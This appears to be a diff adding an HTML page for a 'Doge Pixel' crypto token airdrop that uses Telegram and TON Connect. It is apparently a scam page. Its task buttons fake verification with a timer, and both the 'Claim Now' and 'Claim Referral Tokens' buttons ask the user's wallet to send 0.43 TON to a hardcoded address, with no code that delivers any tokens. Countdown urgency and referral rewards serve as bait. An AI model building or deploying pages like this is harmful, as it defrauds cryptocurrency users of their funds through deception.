@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Doge Pixel Token Claim</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest"></script>
+  <script>
+    // Countdown Timer
+    document.addEventListener('DOMContentLoaded', () => {
+      const countdown = document.getElementById('countdown');
+      const endDate = new Date('2025-08-04T17:00:00').getTime();
+
+      const timer = setInterval(() => {
+        const now = new Date().getTime();
+        const distance = endDate - now;
+        if (distance <= 0) {
+          countdown.innerHTML = 'Airdrop Ended';
+          clearInterval(timer);
+        } else {
+          const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+          const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+          const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+          const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+          countdown.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+        }
+      }, 1000);
+    });
+
+    // Task states
+    const taskStates = {
+      1: { state: 'join', link: 'https://t.me/DogePixelTeam' },
+      2: { state: 'join', link: 'https://t.me/doge_Pixel' }
+    };
+
+    function handleTask(id) {
+      const btn = document.getElementById(`task-btn-${id}`);
+      if (taskStates[id].state === 'join') {
+        window.open(taskStates[id].link, '_blank');
+        taskStates[id].state = 'check';
+        btn.innerText = 'Check';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-yellow-500', 'hover:bg-yellow-600');
+      } else if (taskStates[id].state === 'check') {
+        btn.innerText = 'Checking...';
+        btn.classList.add('bg-yellow-400', 'cursor-not-allowed');
+        setTimeout(() => {
+          btn.innerText = '✅ Completed';
+          btn.disabled = true;
+          btn.classList.remove('bg-yellow-400', 'cursor-not-allowed');
+          btn.classList.add('bg-green-600');
+          taskStates[id].state = 'completed';
+        }, 3000);
+      }
+    }
+
+    // Telegram WebApp Integration
+    function connectTelegram() {
+      if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+        const user = Telegram.WebApp.initDataUnsafe.user;
+        if (user && user.username) {
+          alert('Connected as: @' + user.username);
+        } else {
+          alert('Telegram user info not available.');
+        }
+      } else {
+        alert('Telegram WebApp not detected');
+      }
+    }
+
+    // TON Wallet Connection
+    const tonConnect = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json',
+      buttonRootId: 'ton-wallet-button'
+    });
+
+    async function claimTokens(type) {
+      try {
+        const tx = {
+          validUntil: Math.floor(Date.now() / 1000) + 360,
+          messages: [
+            {
+              address: 'UQD7zTcEBRLNnI9DXJfzkauk0gP_PqerayMyOXfkiZ7UyGhj',
+              amount: '430000000', // 0.43 TON in nanotons
+              payload: ''
+            }
+          ]
+        };
+        await tonConnect.sendTransaction(tx);
+        alert('Transaction sent!');
+      } catch (err) {
+        alert('Transaction failed: ' + err.message);
+      }
+    }
+
+    function copyReferralLink() {
+      navigator.clipboard.writeText('https://dogepixel.com/?ref=123456');
+      alert('Referral link copied!');
+    }
+  </script>
+</head>
+<body class="min-h-screen bg-gradient-to-br from-blue-900 to-gray-900 text-white font-sans">
+  <div class="max-w-xl mx-auto p-6">
+    <header class="flex items-center gap-4 mb-8">
+      <img src="https://iili.io/FwRRNN2.png" alt="Doge Pixel" class="h-12 w-12 rounded-full">
+      <h1 class="text-3xl font-bold text-yellow-400">Doge Pixel</h1>
+    </header>
+
+    <div class="bg-gray-800 p-6 rounded-2xl shadow-lg mb-8 text-center">
+      <h2 class="text-2xl font-semibold text-yellow-400 mb-2">Airdrop Ends In</h2>
+      <p id="countdown" class="text-3xl font-bold text-white">Loading...</p>
+      <p class="text-sm text-gray-400 mt-2">August 4, 2025, 17:00</p>
+    </div>
+
+    <div class="bg-gray-800 p-6 rounded-2xl shadow-lg mb-8">
+      <h2 class="text-2xl font-semibold text-yellow-400 mb-3">Doge Pixel</h2>
+      <p class="text-gray-300">
+        Doge Pixel – The Future of Fun Finance!<br>
+        Unleashing pixelated power through meme magic,<br>
+        Backed by community, driven by creativity.<br>
+        Claim your share in the Doge Pixel revolution,<br>
+        Where each token holds playful potential.<br>
+        Join tasks, earn rewards, and grow with us!
+      </p>
+    </div>
+
+    <div class="mb-8">
+      <div class="flex justify-between items-center mb-4">
+        <h2 class="text-2xl font-semibold text-yellow-400">
+          <img src="https://iili.io/Fw10gvR.png" alt="Tasks Icon" class="inline-block w-6 h-6 mr-2">Complete Tasks
+        </h2>
+        <button onclick="connectTelegram()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm">Telegram Connect</button>
+      </div>
+      <div class="grid gap-4">
+        <div class="bg-gray-800 p-5 rounded-2xl flex justify-between items-center">
+          <span class="text-gray-200">Join DogePixel Team</span>
+          <button id="task-btn-1" onclick="handleTask(1)" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm">Join</button>
+        </div>
+        <div class="bg-gray-800 p-5 rounded-2xl flex justify-between items-center">
+          <span class="text-gray-200">Join Doge Pixel</span>
+          <button id="task-btn-2" onclick="handleTask(2)" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm">Join</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-gray-800 p-6 rounded-2xl shadow-lg mb-8">
+      <h2 class="text-2xl font-semibold text-yellow-400 mb-3">
+        <img src="https://iili.io/Fw10iQt.png" alt="Claim Icon" class="inline-block w-6 h-6 mr-2">Claim Tokens
+      </h2>
+      <p class="text-gray-300 mb-2">
+        Claim 12,000 Doge Pixel tokens by completing tasks.<br>
+        Only 0.43 TON per user – Limited to 40,000 users!
+      </p>
+      <div id="ton-wallet-button"></div>
+      <button onclick="claimTokens('main')" class="mt-4 bg-pink-600 hover:bg-pink-700 px-6 py-3 rounded-lg w-full text-lg font-semibold">Claim Now</button>
+    </div>
+
+    <div class="bg-gray-800 p-6 rounded-2xl shadow-lg">
+      <h2 class="text-2xl font-semibold text-yellow-400 mb-3">
+        <img src="https://iili.io/Fw10PjI.png" alt="Referral Icon" class="inline-block w-6 h-6 mr-2">Referral
+      </h2>
+      <p class="text-gray-300 mb-2">Invite friends and earn 3,000 $DOGEPIXEL per referral!</p>
+      <div class="flex items-center bg-gray-900 p-3 rounded-lg mb-3">
+        <input type="text" readonly value="https://dogepixel.com/?ref=123456" class="flex-1 bg-transparent text-sm text-gray-300" />
+        <button onclick="copyReferralLink()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm">Copy</button>
+      </div>
+      <button onclick="claimTokens('referral')" class="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg w-full text-lg font-semibold">Claim Referral Tokens</button>
+    </div>
+  </div>
+</body>
+</html>
